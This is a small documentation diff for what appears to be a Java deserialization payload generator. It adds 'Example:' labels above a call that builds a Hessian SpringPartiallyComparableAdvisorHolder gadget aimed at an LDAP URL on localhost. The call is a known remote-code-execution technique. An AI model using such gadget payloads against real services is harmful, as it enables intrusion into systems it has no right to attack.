@@ -10,6 +10,7 @@
 
 返回gadget对象
 
+例子:
 ```
 new Hessian().apiRun("SpringPartiallyComparableAdvisorHolder",new String[]{"ldap://127.0.0.1:138/obj"})
 ```
@@ -18,6 +19,7 @@ new Hessian().apiRun("SpringPartiallyComparableAdvisorHolder",new String[]{"ldap
 
 返回gadget对象，序列化之后的数据
 
+例子:
 ```
 new Hessian().apiRun("SpringPartiallyComparableAdvisorHolder",new String[]{"ldap://127.0.0.1:138/obj"})
 ```
